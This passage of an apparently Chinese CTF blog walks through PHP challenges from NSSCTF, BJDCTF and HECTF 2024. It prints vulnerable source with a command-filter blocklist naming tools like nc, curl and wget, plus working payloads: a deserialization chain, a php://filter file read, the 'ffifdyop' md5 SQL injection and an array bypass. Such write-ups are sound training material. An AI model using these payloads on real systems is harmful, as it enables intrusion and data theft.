class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​简单的 PHP 反序列化，不过需要结合原生类去读取文件，因为 <code>school</code>  类中的 <code>IPO</code>  方法存在可以控制的自定义 new 的对象，所以可以想到的是用 <code>SplFileObject</code>  原生类来读取文件，刚好存在 echo 可以输出，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> classroom;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> school;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//POST：</span></span><br><span class="line"><span class="comment">//a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5">#</a> [BJDCTF 2020]easy_md5：</h3><p>​这个考点有点意思，需要特别关注下，打开网页之后是一个搜索框，抓包看响应头发现了一个 hint：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5(<span class="built_in">$</span>pass,true)</span><br></pre></td></tr></table></figure><p>​这里出现了这个考点， <code>md5($pass,true)</code>  的绕过方式，照例来说，这里猜测是万能密码，需要 md5 加密之后扔到 MySQL 查询时候得到的是 <code>'or'[参数]'</code>  这种类型的结果，所以，问了下 AI，Ai 给出了正确答案，就是  <code>ffifdyop</code> ，这里经过加密后得到的是： <code>'or'6\xbb\xd9\x83\x1a\xe8\xd2\x1d\xc3\xe5\x8e\x8a</code>  的 16 进制数，MySQL 里查询是像上面数据一样，也就成功执行了注入了。</p><p>​下一步，跳转进了下一个页面之后，直接读取源代码，看到了提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: levell14.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​直接访问 <code>levell14.php</code>  文件，得到最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​直接数组绕过：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1<span class="built_in">&amp;</span>param2[]=2</span><br></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn：</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从nssctf开始的复建之路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#从nssctf开始的复建之路&quot;&gt;#&lt;/a&gt; 从 NSSCTF 开始的复建之路&lt;/h1&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="发电日常" scheme="http://blog.g01den.top/categories/Daily/"/>
    
    
    <category term="Daily life" scheme="http://blog.g01den.top/tags/Daily-life/"/>
    
  </entry>
  
  <entry>
    <title>【2024】HECTF-个人整理向</title>
    <link href="http://blog.g01den.top/posts/de34fe7b.html"/>
    <id>http://blog.g01den.top/posts/de34fe7b.html</id>
    <published>2024-12-09T12:59:36.000Z</published>
    <updated>2024-12-09T13:13:34.107Z</updated>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#wp">WP：</a><ul><li><a href="#web">Web：</a><ul><li><a href="#are-you-happy">Are you happy?：</a></li><li><a href="#baby_unserialize">baby_unserialize：</a></li><li><a href="#baby_sql">baby_sql：</a><ul><li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">非预期：</a></li><li><a href="#%E9%A2%84%E6%9C%9F%E8%A7%A3">预期解</a></li></ul></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99">你一个人专属的进货网站：</a></li><li><a href="#ezweb">ezweb</a></li><li><a href="#ezjava">ezjava：</a></li></ul></li><li><a href="#misc">Misc：</a><ul><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85">简单的压缩包：</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#sign-in">sign in</a></li><li><a href="#find-eggy">find eggy：</a></li><li><a href="#arcaea_sorting">Arcaea_Sorting：</a></li><li><a href="#arcaea_sorting_revenge">Arcaea_Sorting_Revenge：</a></li></ul></li><li><a href="#re">Re：</a><ul><li><a href="#babyre">babyre：</a></li></ul></li><li><a href="#crypto">Crypto：</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89">迷茫的艾米莉</a></li><li><a href="#seven-more">seven more</a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB">翻一翻：</a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF">不合格的魔药：</a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6">情书与破碎的证书</a></li></ul></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E8%AE%B0%E5%BD%95">题目描述记录：</a><ul><li><a href="#web-2">Web：</a><ul><li><a href="#are-u-happy"><strong>Are u happy</strong></a></li><li><a href="#baby_sql-2"><strong>baby_sql</strong></a></li><li><a href="#baby_unserialize-2"><strong>baby_unserialize</strong></a></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-2"><strong>你一个人专属的进货网站</strong></a></li><li><a href="#ezweb-2"><strong>ezweb</strong></a></li><li><a href="#ezjava-2">ezjava</a></li></ul></li><li><a href="#re-2">Re</a><ul><li><a href="#babyre-2"><strong>babyre</strong></a></li><li><a href="#littleasm"><strong>littleasm</strong></a></li><li><a href="#pepy"><strong>PE?py?</strong></a></li><li><a href="#easyree"><strong>easyree</strong></a></li><li><a href="#ezandroid"><strong>ezAndroid</strong></a></li></ul></li><li><a href="#pwn-2">Pwn</a><ul><li><a href="#sign-in-2"><strong>sign in</strong></a></li><li><a href="#find-eggy-2"><strong>find eggy</strong></a></li><li><a href="#arcaea_sorting-2"><strong>Arcaea_Sorting</strong></a></li><li><a href="#arcaea_sorting_revenge-2"><strong>Arcaea_Sorting_Revenge</strong></a></li><li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5"><strong>喵喵喵</strong></a></li><li><a href="#lip"><strong>lip</strong></a></li></ul></li><li><a href="#crypto-2">Crypto</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-2"><strong>迷茫的艾米莉</strong></a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-2"><strong>翻一翻</strong></a></li><li><a href="#seven-more-2"><strong>seven more</strong></a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-2"><strong>情书与破碎的证书</strong></a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-2"><strong>不合格的魔药</strong></a></li></ul></li><li><a href="#misc-2">Misc</a><ul><li><a href="#rem_you"><strong>Rem_You</strong></a></li><li><a href="#funny"><strong>funny</strong></a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-2"><strong>简单的压缩包</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93"><strong>恶势力的仓库</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95"><strong>恶势力的聊天记录</strong></a></li><li><a href="#baby_unserialize-3"><strong>baby_unserialize</strong></a></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-3"><strong>你一个人专属的进货网站</strong></a></li><li><a href="#ezweb-3"><strong>ezweb</strong></a></li><li><a href="#ezjava-3">ezjava</a></li></ul></li><li><a href="#re-3">Re</a><ul><li><a href="#babyre-3"><strong>babyre</strong></a></li><li><a href="#littleasm-2"><strong>littleasm</strong></a></li><li><a href="#pepy-2"><strong>PE?py?</strong></a></li><li><a href="#easyree-2"><strong>easyree</strong></a></li><li><a href="#ezandroid-2"><strong>ezAndroid</strong></a></li></ul></li><li><a href="#pwn-3">Pwn</a><ul><li><a href="#sign-in-3"><strong>sign in</strong></a></li><li><a href="#find-eggy-3"><strong>find eggy</strong></a></li><li><a href="#arcaea_sorting-3"><strong>Arcaea_Sorting</strong></a></li><li><a href="#arcaea_sorting_revenge-3"><strong>Arcaea_Sorting_Revenge</strong></a></li><li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5-2"><strong>喵喵喵</strong></a></li><li><a href="#lip-2"><strong>lip</strong></a></li></ul></li><li><a href="#crypto-3">Crypto</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-3"><strong>迷茫的艾米莉</strong></a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-3"><strong>翻一翻</strong></a></li><li><a href="#seven-more-3"><strong>seven more</strong></a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-3"><strong>情书与破碎的证书</strong></a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-3"><strong>不合格的魔药</strong></a></li></ul></li><li><a href="#misc-3">Misc</a><ul><li><a href="#rem_you-2"><strong>Rem_You</strong></a></li><li><a href="#funny-2"><strong>funny</strong></a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-3"><strong>简单的压缩包</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93-2"><strong>恶势力的仓库</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95-2"><strong>恶势力的聊天记录</strong></a></li></ul></li></ul></li></ul>(这里写目录标题)<br> 本来想整理下所有的 wp 的，结果最后发现好多都不会，别的不会的抄 wp 的话似乎也就只有抄大佬们交上来的 wp，不大好，所以最后只写了部分 wp，剩下等到学长们把官方 wp 传上去再整理。</p><h1 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP：</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web：</h2><h3 id="are-you-happy"><a class="markdownIt-Anchor" href="#are-you-happy">#</a> Are you happy?：</h3><p>​game.js 里找，flag 在里面，根据 flag 的格式，flag 开头是 HECTF，将这个字段 base64 编码下，然后就可以搜索了。</p><h3 id="baby_unserialize"><a class="markdownIt-Anchor" href="#baby_unserialize">#</a> baby_unserialize：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag in /flag&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;temp = <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="title function_ invoke__">func1</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;temp === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cls-&gt;str1 = <span class="variable language_">$this</span>-&gt;str3;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have fun&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">flag in /flag</span><br></pre></td></tr></table></figure><p>​首先是从有 system 的函数开始看，首先就是需要有能够触发 class02 <code>__involk</code>  的地方，这里就需要找到其他的动态函数调用的点，在 class00 的 <code>__set</code>  处找到了，之后在 class01 的 <code>__tostring</code>  里找到了，也就是 <code>$this-&gt;cls-&gt;str1 = $this-&gt;str3;</code> ，不过，这里需要将 cls 修改成 class00 才行，之后再往上，有个比较， <code>if ($this-&gt;temp === 1)</code>  这里需要想办法让表达式为 True，刚好，class00 里面的 <code>__call</code>  可以返回 1，并且 <code>$this-&gt;temp = $this-&gt;cls-&gt;func1();</code>  调用了 cls 里面不存在的方法；之后往回看，我们的目的是找到 wakeup 或者 destruct 等等魔术方法，所以还得继续找， <code>__tostring</code>  能够触发的点，看到 User 类，里面找到了 <code>echo $this-&gt;msg;</code>  这里的 msg 是可控的，刚好，可以用来输出操作，也就是把类当作字符串操作，之后就是想办法绕过 check 函数即可，绕过 <code>__wakeup</code>  即可打出组合拳：</p><p>​首先是获得前置 payload，也就是序列化链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable 